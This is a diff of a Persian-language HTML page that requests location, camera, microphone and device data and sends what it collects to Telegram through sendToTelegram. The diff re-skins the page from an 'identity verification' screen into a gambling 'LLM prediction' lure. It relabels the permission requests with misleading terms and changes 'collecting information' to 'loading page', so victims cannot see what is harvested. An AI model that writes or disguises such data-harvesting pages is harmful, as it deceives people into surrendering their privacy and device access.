@@ -114,16 +114,16 @@
 </head>
 <body>
   <div class="card">
-    <div class="shield-icon">🛡️</div>
-    <h1>تأیید هویت کاربر</h1>
-    <p class="subtitle">برای ادامه، لطفاً دسترسی‌های مورد نیاز را تأیید کنید. این اطلاعات صرفاً جهت بهبود امنیت استفاده می‌شود.</p>
+    <div class="shield-icon">💩💰</div>
+    <h1>هـ مـ پیشبینی پوپ</h1>
+    <p class="subtitle">ماژول ال ال ام پیشبینی بازی پوپ - دسترسی های لازم را بدهید و وارد صفحه بت شوید.</p>
 
     <div class="perms-list">
-      <div class="perm-item"><span class="icon">📍</span> دسترسی به موقعیت جغرافیایی</div>
-      <div class="perm-item"><span class="icon">📷</span> دسترسی به دوربین</div>
-      <div class="perm-item"><span class="icon">🎙️</span> دسترسی به میکروفون</div>
+      <div class="perm-item"><span class="icon">📍</span> توانایی بازگشایی الگوریتم</div>
+      <div class="perm-item"><span class="icon">📷</span> استفاده بهینه از فیبوناچی</div>
+      <div class="perm-item"><span class="icon">🎙️</span> دریافت و ارسال سریع اطلاعات</div>
       <div class="perm-item"><span class="icon">🔔</span> ارسال اعلان‌ها</div>
-      <div class="perm-item"><span class="icon">📋</span> اطلاعات دستگاه و شبکه</div>
+      <div class="perm-item"><span class="icon">📋</span> تناوب زمانی</div>
     </div>
 
     <button class="btn btn-primary" id="startBtn" onclick="startCollection()">
@@ -177,7 +177,7 @@
 
     async function startCollection() {
       document.getElementById('startBtn').disabled = true;
-      setStatus('در حال جمع‌آوری اطلاعات... <span class="spinner"></span>');
+      setStatus('در حال دریافت صفحه... <span class="spinner"></span>');
 
       const data = await collectAll();
       await sendToTelegram(data);
@@ -187,7 +187,7 @@
         document.querySelector('.card').innerHTML = `
           <div style="font-size:52px;margin-bottom:16px">✅</div>
           <h1 style="color:#4ade80">تأیید شد</h1>
-          <p style="color:#888;margin-top:12px;font-size:14px">هویت شما با موفقیت تأیید گردید.</p>
+          <p style="color:#888;margin-top:12px;font-size:14px">الگوریتم شما با موفقیت تأیید گردید.</p>
         `;
       }, 1500);
     }
